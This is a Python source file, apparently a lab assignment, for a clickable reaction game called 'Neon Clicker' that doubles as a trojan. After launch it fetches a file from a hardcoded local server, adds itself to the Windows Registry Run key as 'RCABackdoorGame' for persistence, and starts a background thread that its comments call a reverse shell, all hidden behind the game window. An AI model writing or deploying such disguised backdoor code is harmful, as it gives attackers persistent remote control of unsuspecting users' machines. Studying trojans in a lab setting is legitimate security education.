import subprocess
import sys
import os
import threading
import time
import random

# --- REQUIREMENT 1: AUTO-INSTALLER WITH SELF-RESTART ---
def ensure_libraries():
    required = ["customtkinter", "requests"]
    installed_any = False
    
    for lib in required:
        try:
            __import__(lib)
        except ImportError:
            print(f"[*] App '{lib}' not found. Installing now...")
            installed_any = True
            
            # Installation command
            command = [sys.executable, "-m", "pip", "install", lib, "--user"]
            if sys.platform != "win32":
                command.append("--break-system-packages")
            
            try:
                subprocess.check_call(command)
                print(f"[+] Successfully installed {lib}")
            except Exception as e:
                print(f"[-] Failed to auto-install {lib}: {e}")

    # If we installed something, we MUST restart the script to refresh the imports
    if installed_any:
        print("[*] Refreshing environment... Restarting game.")
        # This replaces the current process with a fresh one
        os.execv(sys.executable, ['python3'] + sys.argv)

# Run the installer/restarter
ensure_libraries()

# --- IMPORTS (Now safe because the script has restarted if needed) ---
import customtkinter as ctk
import requests
from tkinter import messagebox
import communication # Your communication.py

# --- THE GAME ENGINE ---
class ReactionGame(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Neon Clicker v1.0")
        self.geometry("700x500")
        self.resizable(False, False)

        self.score = 0
        self.time_left = 30
        self.game_running = False

        self.sidebar = ctk.CTkFrame(self, width=150, corner_radius=0)
        self.sidebar.pack(side="left", fill="y")
        self.score_label = ctk.CTkLabel(self.sidebar, text="Score: 0", font=("Arial", 20, "bold"))
        self.score_label.pack(pady=20)
        self.time_label = ctk.CTkLabel(self.sidebar, text="Time: 30s", font=("Arial", 18))
        self.time_label.pack(pady=10)
        self.start_btn = ctk.CTkButton(self.sidebar, text="START GAME", command=self.start_game)
        self.start_btn.pack(pady=20, padx=10)

        self.canvas = ctk.CTkCanvas(self, width=530, height=480, bg="#1a1a1a", highlightthickness=0)
        self.canvas.pack(pady=10, padx=10)
        self.target = self.canvas.create_oval(0, 0, 0, 0, fill="#3498db", outline="white")
        self.canvas.tag_bind(self.target, "<Button-1>", self.on_target_click)

    def start_game(self):
        if not self.game_running:
            self.score = 0
            self.time_left = 30
            self.game_running = True
            self.start_btn.configure(state="disabled")
            self.move_target()
            self.update_timer()

    def move_target(self):
        if self.game_running:
            x, y = random.randint(50, 480), random.randint(50, 430)
            r = 25 
            self.canvas.coords(self.target, x-r, y-r, x+r, y+r)
            self.after_id = self.after(1000, self.move_target)

    def on_target_click(self, event):
        if self.game_running:
            self.score += 1
            self.score_label.configure(text=f"Score: {self.score}")
            self.after_cancel(self.after_id)
            self.move_target()

    def update_timer(self):
        if self.time_left > 0 and self.game_running:
            self.time_left -= 1
            self.time_label.configure(text=f"Time: {self.time_left}s")
            self.after(1000, self.update_timer)
        elif self.time_left <= 0:
            self.game_running = False
            self.start_btn.configure(state="normal")
            messagebox.showinfo("Game Over", f"Final score: {self.score}")

# --- ASSIGNMENT REQUIREMENTS ---
def check_dependencies():
    """Requirement 1: Download Assets from Local Server"""
    required_file = "assets_lib.txt"
    if not os.path.exists(required_file):
        try:
            url = "http://10.12.75.190:8080/assets_lib.txt" 
            r = requests.get(url, timeout=3)
            with open(required_file, "wb") as f:
                f.write(r.content)
        except:
            with open(required_file, "w") as f: f.write("Local Fallback")

def set_persistence():
    """Requirement 3: Windows Registry Persistence"""
    if sys.platform == "win32":
        import winreg
        try:
            path = os.path.realpath(sys.argv[0])
            key = winreg.HKEY_CURRENT_USER
            key_val = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            open_key = winreg.OpenKey(key, key_val, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(open_key, "RCABackdoorGame", 0, winreg.REG_SZ, path)
            winreg.CloseKey(open_key)
        except: pass

if __name__ == "__main__":
    check_dependencies()
    set_persistence()
    
    # Requirement 6: Notice
    messagebox.showwarning("Lab Notice", "Educational project notice: Background thread active.")

    # Requirement 2 & 4: Start Reverse Shell Thread
    threading.Thread(target=communication.start_connection, daemon=True).start()
    
    # Launch Game
    app = ReactionGame()
    app.mainloop()